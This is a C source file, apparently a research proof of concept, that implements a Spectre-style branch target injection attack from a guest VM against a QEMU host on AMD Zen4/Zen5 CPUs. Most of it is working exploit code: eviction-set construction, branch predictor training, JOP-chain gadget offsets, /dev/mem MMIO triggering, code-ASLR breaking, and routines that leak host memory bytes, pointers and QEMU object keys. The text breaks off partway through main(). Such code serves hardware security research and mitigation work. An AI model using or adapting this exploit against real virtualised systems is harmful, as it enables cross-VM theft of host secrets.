// #define DEBUG_ADDR
// #define DEBUG_HIT
// #define DEBUG_RB
// #define DEBUG_HIST
// #define DEBUG_LEAK
// #define DEBUG_LEAK_PRINT
// #define DEBUG_PTR_LEAK
// #define DEBUG_RESOLVE
// #define DEMO

#define ROUNDS           4
#define RB_ENTRY         0
#define RB_OFFSET        0x10cc0
#define RB_SLOTS         4
#define CACHE_MISS_THRES 300

// #define NO_MMIO
#define REDUCE_L3 // speeds things up a lot
#define AUTOMATIC_KEY_SELECTION
// automate the key selection when running evaluation
#ifdef AUTOMATIC_KEY_SELECTION
#define QEMU_MAGIC_ROOT_OBJECT   3
#define QEMU_MAGIC_SECRET_OBJECT 6
#else
#define QEMU_MAGIC_ROOT_OBJECT   -1
#define QEMU_MAGIC_SECRET_OBJECT -1
#endif

#define MEM_SIZE                 (PAGE_1G / 8)
#define MMIO_BASE                0xfed00000
#define HVA_SRC                  0x555555e8bea1                  // offset 0x937ea1
#define HVA_VICTIM_DST           0x540000000000                  // arbitrary
#define HVA_DST_STAGE_1          (HVA_SRC - 0x937ea1 + 0xac334e) // offset 0xac334e, JOP chain
#define HVA_DST_STAGE_2          (HVA_SRC - 0x937ea1 + 0x8260b5) // offset 0x8260b5, JOP chain
#define HVA_DST_RAX_LEAK         (HVA_SRC - 0x937ea1 + 0x931987) // offset 0x931987, JOP chain
#define HVA_DST_RB_FIND          (HVA_SRC - 0x937ea1 + 0x940838) // offset 0x940838, JOP chain
#define HVA_DST_HPET             0x555555c41040                  // hpet target
#define QEMU_OBJECTMAYHEM_STATIC 0x5555571822f0
#define GADGET_OFFSET_0          0x2b58
#define GADGET_OFFSET_1          0x0
#define GADGET_OFFSET_2          0x0
#define NEXT_POINTER_OFFSET_2    0x2b50
#define EVICT_MEM_ADDR           0x700000000000

// Uarch specific config
#if defined(MARCH_ZEN5)
#define NUM_MEASUREMENTS  8
#define EVICT_ITERATIONS  2
#define EVICTION_BASELINE 160
#define L2_EVICTION_SIZE  18
#define L2_SETS           1024
#define L2_FREE_SHIFT     16
#define L2_2MB_SET_SIZE   32
#define L2_1GB_SET_SIZE   1024 // max 8192
#define L3_SETS           32 * 1024
#define L3_SET_SIZE       64
#define NUM_TRAIN         4
#define NUM_UNTRAIN       2
#define REDUCE_CHUNK      8
#define LEAK_ROUNDS       (ROUNDS)
#define LEAK_THRESH       (ROUNDS / 4)
#define RB_INITIAL_ROUNDS (ROUNDS / 2)
#elif defined(MARCH_ZEN4)
#define NUM_MEASUREMENTS  16
#define EVICT_ITERATIONS  2
#define EVICTION_BASELINE 135
#define L2_EVICTION_SIZE  14
#define L2_SETS           2048
#define L2_FREE_SHIFT     17
#define L2_2MB_SET_SIZE   16
#define L2_1GB_SET_SIZE   512 // max 8192
#define L3_SETS           32 * 1024
#define L3_SET_SIZE       64
#define NUM_TRAIN         2
#define NUM_UNTRAIN       1
#define REDUCE_CHUNK      8
#define LEAK_ROUNDS       (2 * ROUNDS)
#define LEAK_THRESH       (ROUNDS / 4)
#define RB_INITIAL_ROUNDS (ROUNDS)
#else
#error "Unknown microarchitecture"
#endif
#define L1_THRESH  0
#define L2_THRESH  10
#define L3_THRESH  30
#define RAM_THRESH 300

#define PAGE_4K  (4096UL)
#define PAGE_2M  (512 * PAGE_4K)
#define PAGE_1G  (512 * PAGE_2M)
#define PROT_RW  (PROT_READ | PROT_WRITE)
#define PROT_RWX (PROT_RW | PROT_EXEC)

#include "compiler.h"
#include "jita.h"
#include "kmod/pi.h"
#include "lib.h"
#include "log.h"
#include "mem.h"
#include "psnip.h"
#include "rb_tools_2mb.h"
#include "stub.h"
#include <ctype.h>
#include <err.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

uint64_t break_code_aslr(uint64_t *);

extern char psnip_src_call_label[];
extern char psnip_src_entry_label[];

// clang-format off
uarf_psnip_declare_define(psnip_src,
    "step3:\n\t"                // 0x555555e8be20
    ".fill 0x4b, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"
    "je step2\n\t"              // 0x555555e8be6d
    ".fill 0x21, 0x1, 0x90\n\t"

    "step1: \n\t"               // 0x555555e8be90
    ".fill 0x11, 0x1, 0x90\n\t"
    "psnip_src_call_label:\n\t"
    "call *0x8(%rax)\n\t"       // 0x555555e8bea1
    ".fill 0x2c, 0x1, 0x90\n\t"

    "step2:\n\t"                // 0x555555e8bed0
    "test %ebx,%ebx\n\t"
    "je step1\n\t"              // 0x555555e8bed2
    ".skip 0x7eac\n\t"

    "psnip_src_entry_label:\n\t"// <--- entrypoint of this snippet
    ".fill 0x4c, 0x1, 0x90\n\t" // 0x555555e93d80
    "test %ebx,%ebx\n\t"
    "je step5\n"                // 0x555555e93dce
    ".fill 0x3, 0x1, 0x90\n\t"

    "step4:\n\t"                // 0x555555e93dd7
    ".fill 0x7d, 0x1, 0x90\n\t"
    "lea step3(%rip), %rcx\n\t"
    "call *%rcx\n\t"            // 0x555555e93e5b
    ".fill 0x43, 0x1, 0x90\n\t"

    "step5:\n\t"                // 0x555555e93ea0
    ".fill 0x4c, 0x1, 0x90\n\t"
    "jmp step4\n\t"             // 0x555555e93eec
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_victim_dst,
    "add $16, %rsp\n"
    "ret\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_train_stage_1,
    ".fill 0x8, 0x1, 0x90\n\t"
    "call *0x10(%rax)\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_train_stage_2,
    ".fill 0x100, 0x1, 0x90\n\t"
    "add $24, %rsp\n"
    "ret\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_hpet_signal_dst,
    "mov (%rdx), %r8\n\t"
    "int3\n\t"
);
// clang-format on

uint64_t l2_sets_offset = 0;
uint64_t measurements[NUM_MEASUREMENTS];
uint64_t dst_ptr[0x50];

static int stats_compare_u64(const void *a, const void *b) {
    return *(uint64_t *) a > *(uint64_t *) b;
}

uint64_t stats_median_u64(uint64_t *arr, uint64_t arr_len) {
    if (!arr_len) {
        UARF_LOG_ERROR("0 length array has no median\n");
        return 1;
    }

    uint64_t *copy = calloc(arr_len, sizeof(*arr));

    if (!copy) {
        UARF_LOG_ERROR("Failed to calloc temp array\n");
        return 1;
    }

    memcpy(copy, arr, arr_len * sizeof(*arr));
    qsort(copy, arr_len, sizeof(*arr), stats_compare_u64);

    uint64_t median = copy[arr_len / 2];

    free(copy);

    return median;
}

static volatile uint64_t *set_remove(volatile uint64_t **set_new,
                                     volatile uint64_t **set_old, uint64_t set_size,
                                     uint64_t index) {
    if (index >= set_size) {
        UARF_LOG_ERROR("Index out of bounds\n");
        exit(1);
    }

    volatile uint64_t *removed = set_old[index];
    memmove(set_new, set_old, index * sizeof(set_old[0]));
    memmove(&set_new[index], &set_old[index + 1],
            (set_size - index - 1) * sizeof(set_old[0]));
    return removed;
}

uint64_t measure_self_eviction(volatile uint64_t **eviction_set,
                               uint64_t eviction_set_size) {
    for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
        uint64_t start = rb_rdtsc();
        uarf_lfence();
        for (int e = 0; e < eviction_set_size; ++e) {
            *eviction_set[e];
        }
        uarf_lfence();
        uint64_t end = rb_rdtscp();
        measurements[i] = end - start;
    }
    uint64_t median = stats_median_u64(measurements, NUM_MEASUREMENTS);

    return median;
}

uint8_t check_self_eviction(volatile uint64_t **eviction_set, uint64_t baseline) {

    return measure_self_eviction(eviction_set, L2_EVICTION_SIZE) > baseline + 250;
}

uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
                             volatile uint64_t **eviction_set_2, uint64_t baseline) {
    uint64_t volatile *eviction_set[L2_EVICTION_SIZE];
    for (int i = 0; i < L2_EVICTION_SIZE / 2; ++i) {
        eviction_set[i] = eviction_set_1[i];
    }
    for (int i = L2_EVICTION_SIZE / 2; i < L2_EVICTION_SIZE; ++i) {
        eviction_set[i] = eviction_set_2[i];
    }
    uint64_t total_time = measure_self_eviction(eviction_set, L2_EVICTION_SIZE);

    return total_time > baseline + 200;
}

uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t mem_size, uint64_t baseline,
                      volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE]) {
    static volatile uint64_t *l2_set_wip[L2_SETS][L2_2MB_SET_SIZE] = {0};

    // reset state
    memset(l2_set_wip, 0, sizeof(l2_set_wip[0][0]) * L2_SETS * L2_2MB_SET_SIZE);
    memset(l2_sets, 0, sizeof(l2_sets[0][0]) * L2_SETS * L2_1GB_SET_SIZE);
    l2_sets_offset = 0;

    // find the first 2MB page where we can build all the sets
    for (uint64_t offset_2m = 4; offset_2m < mem_size / PAGE_2M; ++offset_2m) {
        uint64_t base_2m = mem_ptr + (offset_2m << 21);

        // build the sets within the 2MB pages
        uint64_t offset_6b = 0;
        for (; offset_6b < L2_SETS; ++offset_6b) {
            uint64_t base_set = base_2m + (offset_6b << 6);

            for (uint64_t index = 0; index < L2_2MB_SET_SIZE; ++index) {
                l2_set_wip[offset_6b][index] =
                    (volatile uint64_t *) (base_set + (index << L2_FREE_SHIFT) + index);
            }

            if (!check_self_eviction(l2_set_wip[offset_6b], baseline)) {
                break;
            }

            if (offset_6b % 64 == 63) {
            }
        }

        if (offset_6b == L2_SETS) {
            // if this is the first one, just copy over all the sets
            uint64_t num_ok = 0;
            int64_t set_xor = 0;
            for (int64_t i = 0; i < L2_SETS; ++i) {
                // we can calculate a decent heuristic to speed up the
                // collision search
                int64_t search_start = i ^ set_xor;

                // base case, this is the first sets we found
                if (l2_sets_offset == 0) {
                    memcpy(l2_sets[i], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
                else {
                    // try to find an existing L2 set that this one belongs to
                    int64_t hit_index = -1;
                    for (int k = 0; k < 4 && hit_index == -1; ++k) {
                        for (int64_t j = 0; j < L2_SETS; ++j) {
                            int64_t cur_index = (search_start + j) % L2_SETS;
                            if (check_cross_eviction(l2_sets[cur_index], l2_set_wip[i],
                                                     baseline)) {
                                if (j != 0 && i != 0) {
                                    printf("\nMy heuristic is wrong!\n");
                                }
                                if (hit_index != -1) {
                                    UARF_LOG_ERROR("Non-unique L2 set match\n");
                                }
                                hit_index = cur_index;
                                set_xor = cur_index ^ i;
                                break; // remove this to check the precision of our
                                       // approach
                            }
                        }
                    }
                    if (hit_index == -1) {
                        break;
                    }

                    // check that the set is not already extended
                    if (l2_sets[hit_index][l2_sets_offset]) {
                        break;
                    }

                    // add to the set
                    memcpy(&l2_sets[hit_index][l2_sets_offset], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
            }
            if (num_ok == L2_SETS) {
                printf(".");
                fflush(stdout);
                l2_sets_offset += L2_2MB_SET_SIZE;
            }
            else {
                // cleanup for multi-hit check
                for (int i = 0; i < L2_SETS; ++i) {
                    memset(&l2_sets[i][l2_sets_offset], 0,
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                }
            }

            if (l2_sets_offset >= L2_1GB_SET_SIZE) {
                printf("\n");
                return 1;
            }
        }
    }
    printf("\n");
    return 0;
}

void trigger_ibpb() {
    uarf_pi_wrmsr(MSR_PRED_CMD, 1 << MSR_PRED_CMD__IBPB);
}

typedef struct actxt {
    uint64_t entry_point;
    uint64_t rb_hva;
    uint64_t stage_2_addr;
    uint64_t victim_call_src;
    int64_t rb_offset;
    volatile uint64_t **eviction_set;
    size_t eviction_set_size;
    volatile uint64_t *mmio;
} actxt_t;

uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
                    uint64_t pre_load_addr, uint64_t mmio_param, int rb_slot,
                    int early_stop) {
    rb_reset();
    for (size_t i = 0; i < rounds; i++) {
        // evict the training using NOPs?
        // write new code to trick the BTB
        uint8_t new_data[] = {
            0xeb, 0x01,       // jmp next
            0x90,             // nop
            0xff, 0x50, 0x08, // next: call   *0x8(%rax)
        };
        char old_data[sizeof(new_data)];
        uint64_t victim_call_src = actxt->victim_call_src;
        memcpy(old_data, _ptr(victim_call_src), sizeof(new_data));
        memcpy(_ptr(victim_call_src), new_data, sizeof(new_data));
        for (int i = 0; i < NUM_UNTRAIN; ++i) {
            asm volatile(""
                         "call *%2\n\t"
                         :
                         : "a"(dst_ptr), "b"(0), "r"(actxt->entry_point)
                         : "r8", "memory");
        }
        // put back the old code
        memcpy(_ptr(victim_call_src), old_data, sizeof(new_data));

        // Train victim -> disclosure gadget using HVA
        for (int i = 0; i < NUM_TRAIN; ++i) {
            asm volatile(""
                         "call *%2\n\t"
                         :
                         : "a"(dst_ptr), "b"(0), "r"(actxt->entry_point)
                         : "r8", "memory");
        }

        rb_flush();

        if (actxt->eviction_set) {
            for (int k = 0; k < EVICT_ITERATIONS; ++k) {
                for (int e = 0; e < actxt->eviction_set_size; ++e) {
                    *actxt->eviction_set[e];
                }
            }
            uarf_lfence();
        }
        if (pre_load_addr) {
            *(volatile uint64_t *) (pre_load_addr);
        }
        uarf_mfence();

#ifndef NO_MMIO
        actxt->mmio[0] = mmio_param;
#endif

        for (volatile size_t i = 0; i < 10000; i++) {
        }
        rb_reload();

        if (early_stop && rb_hist[rb_slot] > thresh) {
#ifdef DEBUG_HIST
            printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
#endif
            return rb_hist[rb_slot];
        }
    }

    if (rb_hist[rb_slot] > thresh) {
#ifdef DEBUG_HIST
        printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
#endif
        return rb_hist[rb_slot];
    }

    return 0;
}

uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
                          uint64_t thresh, int early_stop) {
    int64_t memory_offset = (RB_ENTRY * RB_STRIDE - (GADGET_OFFSET_2 - RB_OFFSET));
    uint64_t attack_ptr_gva = RB_PTR + memory_offset + actxt->rb_offset;
    uint64_t attack_ptr_hva = actxt->rb_hva + memory_offset + actxt->rb_offset;

    // set next target ourselves: MUAHAHA :D
    *(volatile uint64_t *) (attack_ptr_gva + NEXT_POINTER_OFFSET_2) = actxt->stage_2_addr;

    // put the secret pointer into the memory to be loaded by the gadget
    *(volatile uint64_t *) (attack_ptr_gva + GADGET_OFFSET_0) =
        secret_ptr - GADGET_OFFSET_1;

    return attack_loop(actxt, rounds, thresh, attack_ptr_gva + GADGET_OFFSET_0,
                       attack_ptr_hva, RB_ENTRY, early_stop);
}

uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
    actxt_t sctxt = *actxt;

#define DOWN_EXTEND 64
#define UP_EXTEND   8
#ifdef DEBUG_LEAK
#define CHECK_RANGE     (256 + DOWN_EXTEND + UP_EXTEND)
#define QUICK_THRESHOLD 500
#else
#define CHECK_RANGE     (208 + DOWN_EXTEND)
#define QUICK_THRESHOLD 32
#endif
    // find a long chain that might wrap around
    int chain_start = -1;
#ifdef DEBUG_LEAK
    int chain_end = -1;
#endif
    int maybe_start = -1;
    int maybe_end = -1;
    int chain_size = 0;
    int max_chain_size = 0;
    int miss_count = 0;
    for (int i = 0; i < CHECK_RANGE; ++i) {
        sctxt.rb_offset = -i + DOWN_EXTEND;
        uint8_t hit = check_byte_thresh(&sctxt, secret_ptr, LEAK_ROUNDS, LEAK_THRESH, 1);

#ifdef DEBUG_LEAK
        if (hit) {
            printf("+");
        }
        else {
            printf("-");
        }
        if ((i + 1) % 64 == 0) {
            printf("\n");
        }
#endif

        if (hit) {
            if (maybe_start < 0) {
                maybe_start = i;
                chain_size = 0;
            }
            chain_size += 1;
            if (chain_size >= 4 && chain_size > max_chain_size) {
                chain_start = maybe_start;
                maybe_end = -1;
                max_chain_size = chain_size;
            }
#ifndef DEBUG_LEAK
            if (chain_size > QUICK_THRESHOLD) {
                break;
            }
#endif
        }
        else {
            if (maybe_end < 0) {
                maybe_end = i;
                miss_count = 0;
            }
            miss_count += 1;
            if (miss_count >= 3) {
#ifdef DEBUG_LEAK
                chain_end = maybe_end;
#endif
                maybe_start = -1;
            }
        }
    }
#ifdef DEBUG_LEAK
    printf("\n");
#endif
    uint8_t start_byte = ((chain_start + (256 + 55 - DOWN_EXTEND)) % 256);
    if (byte) {
        *byte = start_byte;
    }
#ifdef DEBUG_LEAK
    uint8_t end_byte = ((chain_end + (256 + -12 - DOWN_EXTEND)) % 256);
    if (start_byte != end_byte) {
        printf("disagreement: %u != %u\n", start_byte, end_byte);
    }
#endif
    if (chain_start == -1)
        return 0;
    return 1;
}

int get_most_common(uint64_t *arr_orig, size_t arr_len, uint64_t *result) {
    if (!arr_len) {
        UARF_LOG_ERROR("get_most_common: zero length array\n");
        return 0;
    }
    // try to find the byte with the most occurences but in a lazy way
    uint64_t most_common_val;
    uint64_t max_count;
    uint64_t cur_val;
    uint64_t cur_count;

    uint64_t *arr = calloc(arr_len, sizeof(*arr_orig));
    if (!arr) {
        UARF_LOG_ERROR("get_most_common: failed to allocate array\n");
        return 0;
    }
    memcpy(arr, arr_orig, arr_len * sizeof(arr));
    qsort(arr, arr_len, sizeof(*arr), stats_compare_u64);

    most_common_val = cur_val = arr[0];
    max_count = cur_count = 1;
    for (int i = 1; i < arr_len; ++i) {
        if (arr[i] == cur_val) {
            cur_count += 1;
            if (cur_count > max_count) {
                max_count = cur_count;
                most_common_val = arr[i];
            }
        }
        else {
            cur_val = arr[i];
            cur_count = 1;
        }
    }

    if (result) {
        *result = most_common_val;
    }

    free(arr);
    return max_count;
}

uint64_t leak_byte_reliably(actxt_t *ctxt, uint64_t secret_ptr, uint8_t *result_ptr) {
#define BYTE_LEAK_RETRIES 4
#define BYTE_INVALID      UINT64_MAX
    uint64_t val_arr[BYTE_LEAK_RETRIES];
    for (int i = 0; i < BYTE_LEAK_RETRIES; ++i) {
        uint8_t val;
        if (leak_byte(ctxt, secret_ptr, &val)) {
            val_arr[i] = val;
        }
        else {
            val_arr[i] = UINT64_MAX;
        }
#ifdef DEBUG_PTR_LEAK
        printf("byte: 0x%02lx\n", val_arr[i]);
#endif
    }

    uint64_t result;
    int count = get_most_common(val_arr, BYTE_LEAK_RETRIES, &result);

    // not enough consistency on the hits
    if (count <= BYTE_LEAK_RETRIES / 4) {
        return 0;
    }

    // filter out invalid bytes
    if (result == BYTE_INVALID) {
        return 0;
    }

    if (result_ptr) {
        *result_ptr = result;
    }
    return 1;
}

uint64_t leak_pointer_reliably(actxt_t *ctxt, uint64_t secret_base_ptr,
                               uint64_t *result_ptr) {
#define ROOT_PTR_SIZE    8
#define PTR_LEAK_RETRIES 4
    union {
        uint8_t arr[ROOT_PTR_SIZE];
        uint64_t val;
        void *ptr;
    } ptr = {.val = 0xEEEEEEEEEEEEEEEE};
    for (int i = 0; i < PTR_LEAK_RETRIES && (ptr.val & 0xFFFF800000000000ul); ++i) {
        for (uint64_t secret_offset = 0; secret_offset < ROOT_PTR_SIZE; ++secret_offset) {
            uint64_t secret_ptr = secret_base_ptr + secret_offset;
            // for (int i = 0; i < 16; ++i) {
            //     attack_loop(ctxt, 256, 256, 0, secret_ptr - GADGET_OFFSET_0, RB_ENTRY);
            // }
            if (!leak_byte_reliably(ctxt, secret_ptr, &ptr.arr[secret_offset])) {
                break;
            }
        }
#ifdef DEBUG_PTR_LEAK
        printf("ptr: 0x%012lx\n", ptr.val);
#endif
    }

    // filter out clearly invalid pointers (when using 48-bit virtual addresses)
    if (ptr.val & 0xFFFF800000000000ul) {
#ifdef DEBUG_PTR_LEAK
        UARF_LOG_ERROR("Not a pointer\n");
#endif
        return 0;
    }

    *result_ptr = ptr.val;
    return 1;
}

uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
                       int default_selection, char *label_parent) {
#ifndef DEBUG_RESOLVE
    printf("%s", label_parent);
    fflush(stdout);
#endif
    uint64_t hash_table_ptr_ptr = parent_obj + 0x10;
    uint64_t hash_table_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_ptr_ptr, &hash_table_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_ptr: 0x%012lx\n", hash_table_ptr);
#else
    printf("->table");
    fflush(stdout);
#endif

    uint8_t size;
    if (!leak_byte_reliably(ctxt, hash_table_ptr, &size)) {
        UARF_LOG_ERROR("Failed to leak hash table size\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("size: 0x%02x\n", size);
#endif

    uint64_t hash_table_key_ptr_ptr = hash_table_ptr + 0x20;
    uint64_t hash_table_key_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_key_ptr_ptr, &hash_table_key_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_key_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_key_ptr: 0x%012lx\n", hash_table_key_ptr);
#else
    printf("->keys\n");
    fflush(stdout);
#endif

    // get all the key pointers
    uint64_t *key_ptrs = calloc(size, sizeof(*key_ptrs));
    for (int i = 0; i < size; ++i) {
        if (!leak_pointer_reliably(ctxt, hash_table_key_ptr + i * sizeof(uint64_t),
                                   &key_ptrs[i])) {
            UARF_LOG_ERROR("Failed to retrieve hash_table_key_ptr[%d]\n", i);
            // return 1;
            continue;
        }
#ifdef DEBUG_RESOLVE
        printf("key_ptr[%02d]: 0x%012lx\n", i, key_ptrs[i]);
#endif
        printf("- keys[%02d]: ", i);
        if (key_ptrs[i] & 0xFFFF00000000ul) {
            uint8_t next_byte = 1;
            // only print the first 32 characters of the key
            int b = 0;
            for (; b < 32; b += 1) {
                if (!leak_byte(ctxt, key_ptrs[i] + b, &next_byte)) {
                    printf("?");
                }
                else {
                    if (next_byte == 0)
                        break;
                    printf("%c", next_byte);
                }
                fflush(stdout);
            }
            // show that we do not print the full key
            if (b == 32 && next_byte != 0) {
                printf("...");
            }
        }
        else {
            printf("(empty)");
        }
        printf("\n");
    }

    // select index to continue
    int index = default_selection;
    if (index < 0) {
        do {
            printf("select index to continue: ");
        } while (scanf("%d", &index) <= 0);
    }
    else {
        printf("auto selected index: %d\n", index);
    }
    if (index < 0 || index >= size) {
        UARF_LOG_ERROR("Invalid choice: %d/%d\n", index, size);
    }
#ifndef DEBUG_RESOLVE
    printf("%s->table", label_parent);
#endif

    uint64_t hash_table_value_ptr_ptr = hash_table_ptr + 0x30;
    uint64_t hash_table_value_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_value_ptr_ptr, &hash_table_value_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_value_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_value_ptr: 0x%012lx\n", hash_table_value_ptr);
#else
    printf("->values");
    fflush(stdout);
#endif

    // get the object at the specificed index
    uint64_t child_obj_prop_ptr_ptr = hash_table_value_ptr + index * sizeof(uint64_t);
    uint64_t child_obj_prop_ptr;
    if (!leak_pointer_reliably(ctxt, child_obj_prop_ptr_ptr, &child_obj_prop_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve child_obj_prop_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("child_obj_prop_ptr: 0x%012lx\n", child_obj_prop_ptr);
#else
    printf("[%d]", index);
    fflush(stdout);
#endif

    uint64_t child_obj_ptr_ptr = child_obj_prop_ptr + 0x40;
    uint64_t child_obj_ptr;
    if (!leak_pointer_reliably(ctxt, child_obj_ptr_ptr, &child_obj_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve child_obj_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("child_obj_ptr: 0x%012lx\n", child_obj_ptr);
#else
    printf("->opaque\n");
    fflush(stdout);
#endif
    *result_ptr = child_obj_ptr;

    return 1;
}

int check_good_l3set(actxt_t *ctxt, int rounds, int thresh) {
#define TEST_BYTE_1 76
#define TEST_BYTE_2 125
    uint64_t secret_ptr_hva = ctxt->rb_hva;
    uint64_t secret_ptr_gva = RB_PTR;

    *(volatile uint64_t *) (secret_ptr_gva) = TEST_BYTE_1;
    ctxt->rb_offset = -TEST_BYTE_1;
    if (check_byte_thresh(ctxt, secret_ptr_hva, rounds, thresh, 1)) {
        *(volatile uint64_t *) (secret_ptr_gva) = TEST_BYTE_2;
        ctxt->rb_offset = -TEST_BYTE_2;
        if (check_byte_thresh(ctxt, secret_ptr_hva, rounds, thresh, 1)) {
            ctxt->rb_offset = 0;
            return 1;
        }
    }
    ctxt->rb_offset = 0;

    return 0;
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    printf("### initialize ###\n");
    clock_t start_initialize = clock();

    uarf_pi_init();

    void *mem = mmap(_ptr(EVICT_MEM_ADDR), MEM_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MFD_HUGE_2MB, -1, 0);
    if (mem == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map 1G\n");
        return 1;
    }
    // make memory mapped and varying contents to ensure that pages are not combined
    for (uint64_t offset = 0; offset < MEM_SIZE; offset += PAGE_4K) {
        *((volatile uint64_t *) (_ul(mem) + offset)) = offset;
    }

    rb_init();

#ifndef NO_MMIO
#ifdef DEBUG_RB
    uint64_t rb_gpa = uarf_va_to_pa(RB_PTR, 0);
    UARF_LOG_INFO("RB GPA: 0x%lx\n", rb_gpa);
#endif

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1) {
        UARF_LOG_ERROR("Failed to open /dev/mem\n");
        return 1;
    }

    volatile uint64_t *mmio =
        mmap(_ptr(0x13100000UL), 8, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_BASE);
    if (mmio == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map MMIO\n");
        return 1;
    }
    mmio[0] = 0xABABABABABABABAB; // test mmio
#endif

    clock_t end_initialize = clock();
#ifndef DEMO
    printf("initialize time = %fs\n",
           ((double) (end_initialize - start_initialize)) / CLOCKS_PER_SEC);
#endif

    printf("\n");
    printf("### break code ASLR ###");
    clock_t start_aslr = clock();
    uint64_t call_offset = ((uint64_t) psnip_src_call_label) - psnip_src.addr;
    uint64_t aslr_offset = 0;
    if (argc > 1) {
        printf("\nusing provided victim location\n");
        uint64_t aslr_addr;
        if (sscanf(argv[1], "0x%lx\n", &aslr_addr) < 0) {
            UARF_LOG_ERROR("Failed to parse aslr_offset\n");
            return 1;
        }
        aslr_offset = aslr_addr - HVA_SRC;
    }
    else {
        if (!break_code_aslr(&aslr_offset)) {
            UARF_LOG_ERROR("Failed to break code ASLR!\n");
            return 1;
        }
    }
    printf("victim at 0x%012lx\n", HVA_SRC + aslr_offset);
    clock_t end_aslr = clock();
#ifndef DEMO
    double code_aslr_time = ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC;
#ifdef MARCH_ZEN4
    printf("code_aslr time = %fs\n", code_aslr_time);
#endif
#endif
    uint64_t rb_hint = 0;
    if (argc > 2) {
        if (sscanf(argv[2], "0x%lx\n", &rb_hint) < 0) {
            UARF_LOG_ERROR("Failed to parse rb_hint\n");
            return 1;
        }
    }

#ifdef DEBUG_ADDR
    UARF_LOG_INFO("HVA_SRC: 0x%012lx\n", HVA_SRC);
    UARF_LOG_INFO("HVA_DST_HPET: 0x%012lx\n", HVA_DST_HPET);
    UARF_LOG_INFO("HVA_DST_STAGE_1: 0x%012lx\n", HVA_DST_STAGE_1);
    UARF_LOG_INFO("HVA_DST_STAGE_2: 0x%012lx\n", HVA_DST_STAGE_2);
#endif

    UarfStub stub_src = uarf_stub_init();
    UarfStub stub_victim_dst = uarf_stub_init();
    UarfStub stub_signal_hpet_dst = uarf_stub_init();
    UarfStub stub_train_stage_1 = uarf_stub_init();
    UarfStub stub_train_stage_2 = uarf_stub_init();
    UarfStub stub_train_rb_find = uarf_stub_init();
    UarfStub stub_train_rax_leak = uarf_stub_init();
    UarfJitaCtxt jita_src = uarf_jita_init();
    UarfJitaCtxt jita_victim_dst = uarf_jita_init();
    UarfJitaCtxt jita_signal_hpet_dst = uarf_jita_init();
    UarfJitaCtxt jita_train_stage_1 = uarf_jita_init();
    UarfJitaCtxt jita_train_stage_2 = uarf_jita_init();
    UarfJitaCtxt jita_train_rb_find = uarf_jita_init();
    UarfJitaCtxt jita_train_rax_leak = uarf_jita_init();

    uarf_jita_push_psnip(&jita_src, &psnip_src);
    uarf_jita_push_psnip(&jita_victim_dst, &psnip_victim_dst);
    uarf_jita_push_psnip(&jita_signal_hpet_dst, &psnip_hpet_signal_dst);
    uarf_jita_push_psnip(&jita_train_stage_1, &psnip_train_stage_1);
    uarf_jita_push_psnip(&jita_train_stage_2, &psnip_train_stage_2);
    uarf_jita_push_psnip(&jita_train_rb_find, &psnip_victim_dst);
    uarf_jita_push_psnip(&jita_train_rax_leak, &psnip_victim_dst);

    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset + aslr_offset));
    uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, _ul(HVA_VICTIM_DST));
    uarf_jita_allocate(&jita_signal_hpet_dst, &stub_signal_hpet_dst,
                       HVA_DST_HPET + aslr_offset);
    uarf_jita_allocate(&jita_train_stage_1, &stub_train_stage_1,
                       HVA_DST_STAGE_1 + aslr_offset);
    uarf_jita_allocate(&jita_train_stage_2, &stub_train_stage_2,
                       HVA_DST_STAGE_2 + aslr_offset);
